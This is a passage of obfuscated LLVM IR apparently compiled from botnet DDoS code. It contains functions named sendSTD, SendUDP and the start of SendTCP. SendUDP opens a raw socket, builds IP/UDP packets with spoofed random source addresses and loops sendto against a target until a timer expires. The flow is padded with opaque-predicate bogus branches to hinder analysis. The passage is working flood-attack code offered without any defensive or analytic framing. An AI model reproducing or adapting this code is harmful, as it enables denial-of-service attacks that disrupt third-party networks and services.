  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %80, %3
  %39 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 36
  %43 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %80

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 50, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #5
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add nsw i64 %55, %57
  %59 = icmp sge i64 %54, %58
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #12
  unreachable

; <label>:63:                                     ; preds = %47
  %64 = load i32, i32* @x.101
  %65 = load i32, i32* @y.102
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %63
  store i32 0, i32* %11, align 4
  %72 = load i32, i32* @x.101
  %73 = load i32, i32* @y.102
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %80

; <label>:80:                                     ; preds = %originalBBpart2, %38
  %81 = load i32, i32* %11, align 4
  %82 = add i32 %81, 1
  store i32 %82, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %63
  store i32 0, i32* %11, align 4
  br label %originalBB
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %52

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* @x.103
  %33 = load i32, i32* @y.104
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load i32, i32* %8, align 4
  %41 = trunc i32 %40 to i16
  %42 = call zeroext i16 @htons(i16 zeroext %41) #10
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  %44 = load i32, i32* @x.103
  %45 = load i32, i32* @y.104
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:52:                                     ; preds = %originalBBpart2, %27
  %53 = load i32, i32* @x.103
  %54 = load i32, i32* @y.104
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i8*, i8** %7, align 8
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %63 = call i32 @getHost(i8* %61, %struct.in_addr* %62)
  %64 = icmp ne i32 %63, 0
  %65 = load i32, i32* @x.103
  %66 = load i32, i32* @y.104
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %64, label %73, label %90

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i32, i32* @x.103
  %75 = load i32, i32* @y.104
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* @x.103
  %83 = load i32, i32* @y.104
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %366

; <label>:90:                                     ; preds = %originalBBpart24
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %92 = getelementptr inbounds [8 x i8], [8 x i8]* %91, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 8, i32 4, i1 false)
  %93 = load i32, i32* %11, align 4
  store i32 %93, i32* %14, align 4
  %94 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %94, i32* %15, align 4
  %95 = load i32, i32* %15, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %98, label %97

; <label>:97:                                     ; preds = %90
  br label %366

; <label>:98:                                     ; preds = %90
  store i32 1, i32* %16, align 4
  %99 = load i32, i32* %15, align 4
  %100 = bitcast i32* %16 to i8*
  %101 = call i32 @setsockopt(i32 %99, i32 0, i32 3, i8* %100, i32 4) #5
  %102 = icmp slt i32 %101, 0
  br i1 %102, label %103, label %120

; <label>:103:                                    ; preds = %98
  %104 = load i32, i32* @x.103
  %105 = load i32, i32* @y.104
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %103
  %112 = load i32, i32* @x.103
  %113 = load i32, i32* @y.104
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %366

; <label>:120:                                    ; preds = %98
  %121 = load i32, i32* @x.103
  %122 = load i32, i32* @y.104
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %120
  store i32 50, i32* %17, align 4
  %129 = load i32, i32* @x.103
  %130 = load i32, i32* @y.104
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %137

; <label>:137:                                    ; preds = %157, %originalBBpart216
  %138 = load i32, i32* @x.103
  %139 = load i32, i32* @y.104
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %137
  %146 = load i32, i32* %17, align 4
  %147 = add nsw i32 %146, -1
  store i32 %147, i32* %17, align 4
  %148 = icmp ne i32 %146, 0
  %149 = load i32, i32* @x.103
  %150 = load i32, i32* @y.104
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart229, label %originalBB18alteredBB

originalBBpart229:                                ; preds = %originalBB18
  br i1 %148, label %157, label %164

; <label>:157:                                    ; preds = %originalBBpart229
  %158 = call i64 @time(i64* null) #5
  %159 = call i32 @rand_cmwc()
  %160 = zext i32 %159 to i64
  %161 = xor i64 %158, %160
  %162 = trunc i64 %161 to i32
  call void @srand(i32 %162) #5
  %163 = call i32 @rand() #5
  call void @init_rand(i32 %163)
  br label %137

; <label>:164:                                    ; preds = %originalBBpart229
  %165 = load i32, i32* %12, align 4
  %166 = sub nsw i32 32, %165
  %167 = shl i32 1, %166
  %168 = sub nsw i32 %167, 1
  %169 = xor i32 %168, -1
  store i32 %169, i32* %18, align 4
  %170 = load i32, i32* %10, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 28, %171
  %173 = call i8* @llvm.stacksave()
  store i8* %173, i8** %19, align 8
  %174 = alloca i8, i64 %172, align 16
  %175 = bitcast i8* %174 to %struct.iphdr*
  store %struct.iphdr* %175, %struct.iphdr** %20, align 8
  %176 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = getelementptr i8, i8* %177, i64 20
  %179 = bitcast i8* %178 to %struct.udphdr*
  store %struct.udphdr* %179, %struct.udphdr** %21, align 8
  %180 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 4
  %184 = load i32, i32* %18, align 4
  %185 = call i32 @getRandomIP(i32 %184)
  %186 = call i32 @htonl(i32 %185) #10
  %187 = load i32, i32* %10, align 4
  %188 = sext i32 %187 to i64
  %189 = add i64 8, %188
  %190 = trunc i64 %189 to i32
  call void @makeIPPacket(%struct.iphdr* %180, i32 %183, i32 %186, i8 zeroext 17, i32 %190)
  %191 = load i32, i32* %10, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 8, %192
  %194 = trunc i64 %193 to i16
  %195 = call zeroext i16 @htons(i16 zeroext %194) #10
  %196 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.1* %197 to %struct.anon.2*
  %199 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %198, i32 0, i32 2
  store i16 %195, i16* %199, align 2
  %200 = call i32 @rand_cmwc()
  %201 = trunc i32 %200 to i16
  %202 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.1* %203 to %struct.anon.2*
  %205 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %204, i32 0, i32 0
  store i16 %201, i16* %205, align 2
  %206 = load i32, i32* %8, align 4
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %210

; <label>:208:                                    ; preds = %164
  %209 = call i32 @rand_cmwc()
  br label %215

; <label>:210:                                    ; preds = %164
  %211 = load i32, i32* %8, align 4
  %212 = trunc i32 %211 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #10
  %214 = zext i16 %213 to i32
  br label %215

; <label>:215:                                    ; preds = %210, %208
  %216 = phi i32 [ %209, %208 ], [ %214, %210 ]
  %217 = trunc i32 %216 to i16
  %218 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.1* %219 to %struct.anon.2*
  %221 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %220, i32 0, i32 1
  store i16 %217, i16* %221, align 2
  %222 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %223 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.1* %223 to %struct.anon.2*
  %225 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %224, i32 0, i32 3
  store i16 0, i16* %225, align 2
  %226 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %227 = bitcast %struct.udphdr* %226 to i8*
  %228 = getelementptr inbounds i8, i8* %227, i64 8
  %229 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %228, i32 %229)
  %230 = bitcast i8* %174 to i16*
  %231 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 2
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = call zeroext i16 @csum(i16* %230, i32 %234)
  %236 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 7
  store i16 %235, i16* %237, align 2
  %238 = call i64 @time(i64* null) #5
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = add nsw i64 %238, %240
  %242 = trunc i64 %241 to i32
  store i32 %242, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %243

; <label>:243:                                    ; preds = %originalBBpart247, %344, %215
  br label %244

; <label>:244:                                    ; preds = %243
  %245 = load i32, i32* %15, align 4
  %246 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %247 = call i64 @sendto(i32 %245, i8* %174, i64 %172, i32 0, %struct.sockaddr* %246, i32 16)
  %248 = call i32 @rand_cmwc()
  %249 = trunc i32 %248 to i16
  %250 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon.1* %251 to %struct.anon.2*
  %253 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %252, i32 0, i32 0
  store i16 %249, i16* %253, align 2
  %254 = load i32, i32* %8, align 4
  %255 = icmp eq i32 %254, 0
  br i1 %255, label %256, label %258

; <label>:256:                                    ; preds = %244
  %257 = call i32 @rand_cmwc()
  br label %279

; <label>:258:                                    ; preds = %244
  %259 = load i32, i32* @x.103
  %260 = load i32, i32* @y.104
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %258
  %267 = load i32, i32* %8, align 4
  %268 = trunc i32 %267 to i16
  %269 = call zeroext i16 @htons(i16 zeroext %268) #10
  %270 = zext i16 %269 to i32
  %271 = load i32, i32* @x.103
  %272 = load i32, i32* @y.104
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %279

; <label>:279:                                    ; preds = %originalBBpart233, %256
  %280 = phi i32 [ %257, %256 ], [ %270, %originalBBpart233 ]
  %281 = load i32, i32* @x.103
  %282 = load i32, i32* @y.104
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %279
  %289 = trunc i32 %280 to i16
  %290 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.1* %291 to %struct.anon.2*
  %293 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %292, i32 0, i32 1
  store i16 %289, i16* %293, align 2
  %294 = call i32 @rand_cmwc()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 4
  %298 = load i32, i32* %18, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #10
  %301 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = bitcast i8* %174 to i16*
  %304 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 2
  %306 = load i16, i16* %305, align 2
  %307 = zext i16 %306 to i32
  %308 = call zeroext i16 @csum(i16* %303, i32 %307)
  %309 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 7
  store i16 %308, i16* %310, align 2
  %311 = load i32, i32* %23, align 4
  %312 = load i32, i32* %14, align 4
  %313 = icmp eq i32 %311, %312
  %314 = load i32, i32* @x.103
  %315 = load i32, i32* @y.104
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %313, label %322, label %345

; <label>:322:                                    ; preds = %originalBBpart237
  %323 = load i32, i32* @x.103
  %324 = load i32, i32* @y.104
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %322
  %331 = call i64 @time(i64* null) #5
  %332 = load i32, i32* %22, align 4
  %333 = sext i32 %332 to i64
  %334 = icmp sgt i64 %331, %333
  %335 = load i32, i32* @x.103
  %336 = load i32, i32* @y.104
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %334, label %343, label %344

; <label>:343:                                    ; preds = %originalBBpart241
  br label %364

; <label>:344:                                    ; preds = %originalBBpart241
  store i32 0, i32* %23, align 4
  br label %243

; <label>:345:                                    ; preds = %originalBBpart237
  %346 = load i32, i32* @x.103
  %347 = load i32, i32* @y.104
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %345
  %354 = load i32, i32* %23, align 4
  %355 = add i32 %354, 1
  store i32 %355, i32* %23, align 4
  %356 = load i32, i32* @x.103
  %357 = load i32, i32* @y.104
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart247, label %originalBB43alteredBB

originalBBpart247:                                ; preds = %originalBB43
  br label %243

; <label>:364:                                    ; preds = %343
  %365 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %365)
  br label %366

; <label>:366:                                    ; preds = %364, %originalBBpart212, %97, %originalBBpart28
  %367 = load i32, i32* @x.103
  %368 = load i32, i32* @y.104
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %366
  %375 = load i32, i32* @x.103
  %376 = load i32, i32* @y.104
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %31
  %383 = load i32, i32* %8, align 4
  %384 = trunc i32 %383 to i16
  %385 = call zeroext i16 @htons(i16 zeroext %384) #10
  %386 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %385, i16* %386, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %387 = load i8*, i8** %7, align 8
  %388 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %389 = call i32 @getHost(i8* %387, %struct.in_addr* %388)
  %390 = icmp ne i32 %389, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %103
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %120
  store i32 50, i32* %17, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %137
  %391 = load i32, i32* %17, align 4
  %_ = sub i32 %391, -1
  %gen = mul i32 %_, -1
  %_19 = shl i32 %391, -1
  %_20 = shl i32 %391, -1
  %_21 = sub i32 0, %391
  %gen22 = add i32 %_21, -1
  %_23 = shl i32 %391, -1
  %_24 = shl i32 %391, -1
  %_25 = sub i32 0, %391
  %gen26 = add i32 %_25, -1
  %_27 = shl i32 %391, -1
  %392 = add nsw i32 %391, -1
  store i32 %392, i32* %17, align 4
  %393 = icmp ne i32 %391, 0
  br label %originalBB18

originalBB31alteredBB:                            ; preds = %originalBB31, %258
  %394 = load i32, i32* %8, align 4
  %395 = trunc i32 %394 to i16
  %396 = call zeroext i16 @htons(i16 zeroext %395) #10
  %397 = zext i16 %396 to i32
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %279
  %398 = trunc i32 %280 to i16
  %399 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %400 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %399, i32 0, i32 0
  %401 = bitcast %union.anon.1* %400 to %struct.anon.2*
  %402 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %401, i32 0, i32 1
  store i16 %398, i16* %402, align 2
  %403 = call i32 @rand_cmwc()
  %404 = trunc i32 %403 to i16
  %405 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %406 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %405, i32 0, i32 3
  store i16 %404, i16* %406, align 4
  %407 = load i32, i32* %18, align 4
  %408 = call i32 @getRandomIP(i32 %407)
  %409 = call i32 @htonl(i32 %408) #10
  %410 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 8
  store i32 %409, i32* %411, align 4
  %412 = bitcast i8* %174 to i16*
  %413 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 2
  %415 = load i16, i16* %414, align 2
  %416 = zext i16 %415 to i32
  %417 = call zeroext i16 @csum(i16* %412, i32 %416)
  %418 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 7
  store i16 %417, i16* %419, align 2
  %420 = load i32, i32* %23, align 4
  %421 = load i32, i32* %14, align 4
  %422 = icmp eq i32 %420, %421
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %322
  %423 = call i64 @time(i64* null) #5
  %424 = load i32, i32* %22, align 4
  %425 = sext i32 %424 to i64
  %426 = icmp sgt i64 %423, %425
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %345
  %427 = load i32, i32* %23, align 4
  %_44 = sub i32 %427, 1
  %gen45 = mul i32 %_44, 1
  %428 = add i32 %427, 1
  store i32 %428, i32* %23, align 4
  br label %originalBB43

originalBB49alteredBB:                            ; preds = %originalBB49, %366
  br label %originalBB49
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.105
  %9 = load i32, i32* @y.106
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
